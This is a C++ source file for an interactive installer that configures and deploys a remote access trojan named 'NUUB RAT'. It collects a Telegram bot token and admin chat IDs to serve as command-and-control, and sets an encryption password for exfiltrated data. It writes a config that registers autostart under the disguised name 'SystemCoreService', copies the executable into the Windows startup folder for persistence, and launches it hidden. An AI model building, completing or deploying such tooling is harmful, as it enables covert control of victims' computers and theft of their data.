// NUUB Installer - Interactive setup for the RAT
// Compile: cl /EHsc /std:c++17 /std:c17 installer.cpp nlohmann_json\single_include\nlohmann\json.hpp /Fe:installer.exe
// Or use CMake build system

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdint>
#include <cstdlib>
#include <filesystem>
#include <algorithm>
#include <random>

#ifdef _WIN32
#include <Windows.h>
#include <shellapi.h>
#pragma comment(lib, "shell32.lib")
#endif

namespace fs = std::filesystem;

// Simple JSON builder
class JsonBuilder {
    std::string indent_;
    std::string content_;

public:
    JsonBuilder() : indent_("") {}

    void begin_object() {
        content_ += "{\n";
        indent_ += "    ";
    }

    void end_object() {
        indent_.resize(indent_.size() - 4);
        content_ += indent_ + "}\n";
    }

    void add_string(const std::string& key, const std::string& value) {
        content_ += indent_ + "\"" + key + "\": \"" + value + "\"";
    }

    void add_number(const std::string& key, int64_t value) {
        content_ += indent_ + "\"" + key + "\": " + std::to_string(value);
    }

    void add_bool(const std::string& key, bool value) {
        content_ += indent_ + "\"" + key + "\": " + (value ? "true" : "false");
    }

    void add_array_begin(const std::string& key) {
        content_ += indent_ + "\"" + key + "\": [";
    }

    void add_array_end() {
        content_ += "]";
    }

    void add_array_element(const std::string& value) {
        content_ += "\"" + value + "\"";
    }

    void add_array_number(int64_t value) {
        content_ += std::to_string(value);
    }

    void comma() {
        content_ += ",\n";
    }

    std::string to_string() const {
        return content_;
    }
};

// Read line from user with default
std::string read_line(const std::string& prompt, const std::string& default_value = "") {
    std::cout << prompt;
    if (!default_value.empty()) {
        std::cout << " [" << default_value << "]";
    }
    std::cout << ": ";

    std::string input;
    std::getline(std::cin, input);

    if (input.empty() && !default_value.empty()) {
        return default_value;
    }
    return input;
}

// Read number from user
int64_t read_number(const std::string& prompt, int64_t default_value) {
    std::string input = read_line(prompt, std::to_string(default_value));
    try {
        return std::stoll(input);
    } catch (...) {
        return default_value;
    }
}

// Read yes/no from user
bool read_yes_no(const std::string& prompt, bool default_value = false) {
    std::string def = default_value ? "y" : "n";
    std::string input = read_line(prompt + " (y/n)", def);
    std::transform(input.begin(), input.end(), input.begin(), ::tolower);
    return input == "y" || input == "yes";
}

// Generate random string (cryptographically secure)
std::string random_string(int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    result.resize(length);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
    for (int i = 0; i < length; ++i) {
        result[i] = charset[dist(gen)];
    }
    return result;
}

void print_banner() {
    std::cout << R"(
 _   _ _   _  ___ _____    ___  ___   _   _  _____
| | | | \ | |/ _ \_   _|  / _ \|_ _| \ | |/ / _ \
| | | |  \| | | | || |   | | | || ||  \| | | | |
| |_| | |\  | |_| || |   | |_| || || |\  | |_| |
 \___/|_| \_|\___/ |_|    \___/___|_| \_|\___/

   Interactive Installer v2.0
)" << std::endl;
}

void print_step(int step, int total, const std::string& description) {
    std::cout << "\n[" << step << "/" << total << "] " << description << std::endl;
    std::cout << std::string(50, '-') << std::endl;
}

int main() {
    print_banner();

    // Check for admin privileges (optional, needed for some features)
    bool is_admin = false;
    #ifdef _WIN32
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            is_admin = elevation.TokenIsElevated != 0;
        }
        CloseHandle(hToken);
    }
    #endif

    if (is_admin) {
        std::cout << "[OK] Running with administrator privileges" << std::endl;
    } else {
        std::cout << "[INFO] Running without admin privileges (some features limited)" << std::endl;
    }

    std::cout << "\nThis installer will configure NUUB RAT for your use.\n" << std::endl;

    // Step 1: Telegram Bot Token
    print_step(1, 6, "Telegram Bot Configuration");
    std::cout << "Create a bot via @BotFather on Telegram and get your token.\n" << std::endl;

    std::string bot_token = read_line("Bot Token");

    // Step 2: Admin Chat IDs
    print_step(2, 6, "Admin Configuration");
    std::cout << "Send /start to your bot and note your chat ID.\n" << std::endl;

    std::vector<std::string> admin_ids;
    std::string first_id = read_line("Admin Chat ID");
    if (!first_id.empty()) {
        admin_ids.push_back(first_id);
    }

    while (read_yes_no("Add another admin?")) {
        std::string id = read_line("Admin Chat ID");
        if (!id.empty()) {
            admin_ids.push_back(id);
        }
    }

    // Step 3: PC Identifier
    print_step(3, 6, "PC Configuration");
    std::string pc_id = read_line("PC Identifier", "PC-001");

    // Step 4: Encryption Password
    print_step(4, 6, "Security Configuration");
    std::cout << "This password encrypts all exfiltrated data.\n" << std::endl;

    std::string enc_password = read_line("Encryption Password");

    if (enc_password.empty()) {
        enc_password = random_string(16);
        std::cout << "Generated random password: " << enc_password << std::endl;
    }

    // Step 5: C2 Encryption (optional)
    print_step(5, 6, "Advanced Configuration");
    bool use_c2_encryption = read_yes_no("Enable C2 traffic encryption?", false);

    std::string c2_key;
    if (use_c2_encryption) {
        c2_key = read_line("C2 Encryption Key");
        if (c2_key.empty()) {
            c2_key = random_string(32);
            std::cout << "Generated random C2 key: " << c2_key << std::endl;
        }
    }

    int64_t heartbeat = read_number("Heartbeat interval (minutes)", 30);

    // Step 6: Generate Config
    print_step(6, 6, "Generating Configuration");

    // Build JSON manually (no external dependencies needed)
    std::string json = "{\n";
    json += "    \"telegram_bot_token\": \"" + bot_token + "\",\n";
    json += "    \"admin_chat_id\": " + (admin_ids.empty() ? "0" : admin_ids[0]) + ",\n";
    json += "    \"admin_chat_ids\": [";
    for (size_t i = 0; i < admin_ids.size(); ++i) {
        if (i > 0) json += ", ";
        json += admin_ids[i];
    }
    json += "],\n";
    json += "    \"pc_identifier\": \"" + pc_id + "\",\n";
    json += "    \"encryption_password\": \"" + enc_password + "\",\n";
    json += "    \"master_log_filename\": \"log_master.txt\",\n";
    json += "    \"activity_log_filename\": \"activity_log.csv\",\n";
    json += "    \"auto_start_entry_name\": \"SystemCoreService\",\n";
    json += "    \"log_filename\": \"nuub.log\",\n";
    json += "    \"heartbeat_interval_minutes\": " + std::to_string(heartbeat) + ",\n";
    json += "    \"c2_encryption_key\": \"" + c2_key + "\"\n";
    json += "}\n";

    // Write config file
    std::ofstream config_file("config.json");
    if (config_file.is_open()) {
        config_file << json;
        config_file.close();
        std::cout << "\n[OK] Configuration saved to config.json" << std::endl;
    } else {
        std::cerr << "[ERROR] Could not write config.json" << std::endl;
        return 1;
    }

    // Print summary
    std::cout << "\n" << std::string(50, '=') << std::endl;
    std::cout << "INSTALLATION COMPLETE" << std::endl;
    std::cout << std::string(50, '=') << std::endl;

    std::cout << "\nConfiguration Summary:" << std::endl;
    std::cout << "  Bot Token: " << bot_token.substr(0, 10) << "..." << std::endl;
    std::cout << "  Admin IDs: ";
    for (size_t i = 0; i < admin_ids.size(); ++i) {
        if (i > 0) std::cout << ", ";
        std::cout << admin_ids[i];
    }
    std::cout << std::endl;
    std::cout << "  PC ID: " << pc_id << std::endl;
    std::cout << "  C2 Encryption: " << (use_c2_encryption ? "Enabled" : "Disabled") << std::endl;
    std::cout << "  Heartbeat: " << heartbeat << " minutes" << std::endl;

    std::cout << "\nNext Steps:" << std::endl;
    std::cout << "  1. Place config.json in the same directory as nuub.exe" << std::endl;
    std::cout << "  2. Run: nuub.exe" << std::endl;
    std::cout << "  3. Send /start to your bot to verify connection" << std::endl;

    if (read_yes_no("\nCopy executable to startup folder?", false)) {
        #ifdef _WIN32
        // Get startup folder path
        char startup_path[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) == S_OK) {
            fs::path dest = fs::path(startup_path) / "nuub.exe";
            fs::path source = fs::current_path() / "nuub.exe";

            if (fs::exists(source)) {
                fs::copy_file(source, dest, fs::copy_options::overwrite_existing);
                std::cout << "[OK] Copied to startup folder: " << dest << std::endl;
            } else {
                std::cout << "[INFO] nuub.exe not found in current directory" << std::endl;
            }
        }
        #endif
    }

    if (read_yes_no("Run the RAT now?", false)) {
        std::cout << "\nStarting NUUB RAT..." << std::endl;
        #ifdef _WIN32
        ShellExecuteA(nullptr, "open", "nuub.exe", nullptr, nullptr, SW_HIDE);
        #else
        system("./nuub &");
        #endif
    }

    std::cout << "\nInstallation finished. Press Enter to exit..." << std::endl;
    std::cin.get();

    return 0;
}
